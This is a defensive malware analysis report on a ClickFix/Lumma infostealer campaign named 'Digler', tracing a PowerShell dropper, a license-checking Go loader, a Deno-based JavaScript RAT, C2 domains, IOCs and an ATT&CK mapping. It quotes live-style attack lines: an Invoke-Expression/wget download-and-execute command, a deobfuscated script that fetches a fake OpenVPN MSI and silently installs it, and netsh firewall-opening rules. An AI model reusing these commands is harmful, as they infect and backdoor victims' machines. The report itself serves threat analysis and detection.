# ClickFix / Lumma Infostealer Analysis

**Campaign Name:** Digler  
**Threat Actor:** Unknown  
**Version Analyzed:** Digler 1.0.1

**Source Thread:**  
https://www.reddit.com/r/cybersecurity_help/comments/1r4ae25/what_does_this_clickfixlumma_infostealer_ps/

------------------------------------------------------------------------

## Table of Contents

- [Initial Discovery](#initial-discovery)
- [checkbinary.exe (Golang Binary)](#checkbinaryexe-golang-binary)
  - [Golang Analysis](#golang-analysis)
- [License Verification Logic](#license-verification-logic)
- [Tasking & Secondary Payload](#tasking--secondary-payload)
- [Deno & JavaScript Stage](#deno--javascript-stage)
  - [Core Functionality](#core-functionality)
  - [Hardcoded C2 Servers](#hardcoded-c2-servers)
- [Indicators of Compromise (IOCs)](#indicators-of-compromise-iocs)
  - [File System Artifacts](#file-system-artifacts)
  - [Registry Keys](#registry-keys)
  - [Network Indicators](#network-indicators)
  - [Windows Services](#windows-services)
  - [Firewall Rules](#firewall-rules)
  - [File Hashes](#file-hashes)
- [MITRE ATT&CK Mapping](#mitre-attck-mapping)

------------------------------------------------------------------------

## Table of Contents
- [Initial Discovery](#initial-discovery)
- [checkbinary.exe (Golang Binary)](#checkbinaryexe-golang-binary)
- [License Verification Logic](#license-verification-logic)
- [Tasking & Secondary Payload](#tasking--secondary-payload)
- [Deno & JavaScript Stage](#deno--javascript-stage)
- [Indicators of Compromise (IOCs)](#indicators-of-compromise-iocs)

------------------------------------------------------------------------

## Initial Discovery

The primary PowerShell (.ps1) command downloads and executes instructions from:

`Invoke-Expression(wget -usebas storage[.]googleapis[.]com/release-v5-dl/fin2.txt)`

using **IEX (Invoke-Expression)**.

The downloaded script sets:

```powershell
$errorActionPreference = "SilentlyContinue"
```

It then hides the malicious payload inside a large text blob designed to generate errors and obstruct analysis.

After removing the junk content, we obtain a Base64 string that is:

1. Reversed
2. Base64-decoded
3. Reversed again

The resulting payload downloads:

```
$uHVWZ = $env:AppData;
function KjmJ($ytiy, $mKSCIavgD){
	wget -usebasic $ytiy -o $mKSCIavgD
	};
function UTmmm($nGaeJTG){
	KjmJ $nGaeJTG $mKSCIavgD
	};
$mKSCIavgD = $env:AppData + '\OpenVPN-2.6.17-I001-amd64.msi';
UTmmm storage[.]googleapis[.]com/release-v5-dl/OpenVPN-2.6.17-I001-amd64.msi;
msiexec.exe /qn /i $mKSCIavgD;;
```

from the same storage bucket and executes it.

The storage bucket contains multiple payload variants.  
The storage was reported & Dumped.


------------------------------------------------------------------------

## checkbinary.exe (Golang Binary)

This executable appears to validate a license key, suggesting a **Malware-as-a-Service (MaaS)** model.

**Hash:**
```
MD5: DAF1CB75EDD8E045F5F6034FC76C097F
```

### Golang Analysis

![](https://github.com/user-attachments/assets/02d2cca6-bcb1-46a1-9068-857a66b51c28)

Further inspection suggests remote key validation:

![](https://github.com/user-attachments/assets/4a5ac6a6-fd45-4d86-b171-95ac346b8cad)

A POST request is sent to a remote worker.  
The endpoint is decoded earlier in a `decrypt()` function:

![](https://github.com/user-attachments/assets/d3ce6363-021a-4bf7-ac56-37bd93bb1194)

This confirms a centralized license verification server:

![](https://github.com/user-attachments/assets/f06c0610-6379-4729-8c9d-407517b9b81d)

Conclusion: the malware operates under a service-based model with centralized validation.

------------------------------------------------------------------------

## License Verification Logic

![](https://github.com/user-attachments/assets/660f8716-30ea-426b-9326-ce00fa1410da)

This condition compares the length of `remote_check` (RSI) to 4.

If length ≠ 4:
- The binary contacts the remote server for license validation  
OR
- Checks if the string equals `"none"`

![](https://github.com/user-attachments/assets/ba76e765-2510-49bc-9a62-8d54d1fa5019)

If the value equals `"none"`:

![](https://github.com/user-attachments/assets/af7d2866-066a-46cc-855d-b2b7bbffd5c8)

License verification is skipped.  
Otherwise, the program exits.

------------------------------------------------------------------------

## Tasking & Secondary Payload

The malware connects to its main C2 server to retrieve additional instructions.

The tasks are of different types:
- Execute_BAT
- Execute_Exe
- Execute_PS1
- Execute_CMD

To know which one's which, the program basically runs a if/else:

<img width="510" height="126" alt="image" src="https://github.com/user-attachments/assets/a69b9604-9d46-4df4-977b-7fdc81bb2d00" />

Compare the first letter and move on in our case we branch to ps1.  
Each retrieves a particular file from the s3 bucket.

A task is received as a json object:

<img width="939" height="194" alt="image" src="https://github.com/user-attachments/assets/f1f2ac4b-9eb4-48f3-ab1e-f63765c82580" />

that contains the address of where to fetch it, First from base64 then from AES-GCM.

For the ps1 it will decode as such:

<img width="875" height="74" alt="image" src="https://github.com/user-attachments/assets/d09b4ec6-901a-4ed2-9400-ce77e60105d1" />

Then be saved & executed:

<img width="662" height="378" alt="image" src="https://github.com/user-attachments/assets/caa76d15-05e0-4e3e-9046-5f310bc5e634" />

Once executed the main program will loop back for further tasks from the command server.

It downloads a secondary file:

![](https://github.com/user-attachments/assets/850be4f1-5dc1-44a9-b74e-e02f68c439a8)

The file is executed and subsequently launched using `wscript.exe`:

![](https://github.com/user-attachments/assets/956587b3-94ec-4a0c-932c-6c743c8896b6)

![](https://github.com/user-attachments/assets/6f692881-6101-4b6a-9c98-07e7d51cbb17)

------------------------------------------------------------------------

## Deno & JavaScript Stage

The PowerShell (IRM/IEX) stage downloads **Deno**, a legitimate JavaScript runtime, used to execute embedded Base64-encoded JavaScript.

The JavaScript contains multiple layers of obfuscation:

![](https://github.com/user-attachments/assets/807be908-2cfa-4175-b826-ce8f93565695)

### Core Functionality

- Acts as a bridge between victim and C2 (4 different servers, hardcoded)
- Maintains persistent connectivity
- Receives, schedules, and executes remote commands
- Manages task orchestration
- Persistence install/uninstall
- CopyExecutable
- RegisterInRegistry
- InstallWindowsService
- AddFirewallRule
- StopAndRemoveService
- RemoveFirewallRule
- UnregisterFromRegistry

**Note:** These persistence functions may be used in upcoming versions of the campaign but for now, they sit unused.

### Hardcoded C2 Servers

The JavaScript RAT contains **4 hardcoded C2 server URLs** that the malware attempts to connect to for command and control communication:

```
http://stat[.]greenslighttcodetdat[.]net
http://aplalink[.]com
http://altsocks101[.]com
http://altsocks2[.]com
```

These domains are embedded directly in the JavaScript payload and serve as fallback mechanisms. If one C2 server is unavailable, the malware will attempt to contact the remaining servers to maintain persistent connectivity.

**Infrastructure Note:** These C2 domains were also identified in related campaigns, suggesting shared threat actor infrastructure or tooling reuse.

------------------------------------------------------------------------

## Indicators of Compromise (IOCs)

### File System Artifacts

- Presence of a `.lnk` file under:

  ```
  %AppData%\Microsoft\Windows\Start Menu\Programs\Startup
  ```

### Registry Keys

**Uninstall Entry:**
```
Location: Software\Microsoft\Windows\CurrentVersion\Uninstall\Oncall

Values:
  - DisplayName: oncall
  - DisplayVersion: *
  - DisplayIcon: *
  - InstallLocation: *
  - UninstallString: --uninstall
  - EstimatedSize: *
  - VersionMajor: *
  - VersionMinor: *
```

**System Policy:**
```
Location: Software\Microsoft\Windows\CurrentVersion\Policies\System
Key: SoftwareSASGeneration
```

### Network Indicators

**C2 Communication Port:**

Active C2 communication observable via:

```
netstat -ano | findstr 10044
```

Port 10044 is used for persistent C2 communication.

**C2 Server URLs (Hardcoded in JavaScript payload):**

```
http://stat[.]greenslighttcodetdat.net
http://aplalink[.]com
http://altsocks101[.]com
http://altsocks2[.]com
```

**Infrastructure:**

```
storage[.]googleapis[.]com/release-v5-dl/*
```

Google Cloud Storage bucket used for payload hosting and distribution.

### Windows Services

```
Service Name: Oncall
Detection: Check via services.msc or Get-Service cmdlet
```

### Firewall Rules

**Rules created via netsh commands:**

```powershell
netsh advfirewall firewall add rule name="oncall Service" dir=in action=allow program=* enable=yes
netsh advfirewall firewall add rule name="oncall Service" dir=out action=allow program=* enable=yes
```

**Note:** `*` indicates fields that can contain any value depending on the specific installation path.

### File Hashes

```
MD5: DAF1CB75EDD8E045F5F6034FC76C097F (checkbinary.exe V1.0.1)
MD5: 14148DB21D3F6AC4C1DAA8D9500DEC26 (Fake OpenVPN installer)
MD5: AD4DDF9C289F28DA9665BE0CA4742710 (CheckBinary.exe v1.0.2) 
```

------------------------------------------------------------------------

## MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name | Implementation |
|--------|-------------|----------------|----------------|
| **Initial Access** | T1566.001 | Phishing: Spearphishing Attachment | ClickFix social engineering delivers malicious PowerShell |
| **Execution** | T1059.001 | Command and Scripting Interpreter: PowerShell | PowerShell dropper executes malicious payload |
| **Execution** | T1059.007 | Command and Scripting Interpreter: JavaScript | Deno runtime executes JavaScript RAT |
| **Persistence** | T1547.001 | Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder | .lnk file in Startup folder |
| **Persistence** | T1543.003 | Create or Modify System Process: Windows Service | "Oncall" service installation |
| **Defense Evasion** | T1027 | Obfuscated Files or Information | Multiple layers of Base64 and reversal obfuscation |
| **Defense Evasion** | T1140 | Deobfuscate/Decode Files or Information | Base64 decode + AES-GCM decryption |
| **Defense Evasion** | T1562.004 | Impair Defenses: Disable or Modify System Firewall | Firewall rules added to allow malware traffic |
| **Defense Evasion** | T1112 | Modify Registry | Registry keys modified for persistence and configuration |
| **Command and Control** | T1071.001 | Application Layer Protocol: Web Protocols | HTTP-based C2 communication |
| **Command and Control** | T1102 | Web Service | Abuse of Google Cloud Storage for payload hosting |
| **Command and Control** | T1573 | Encrypted Channel | AES-GCM encryption for C2 communications |

------------------------------------------------------------------------

# Campaign Name: Digler
# Threat Actor: Unknown
# Version analysed: Digler 1.0.1
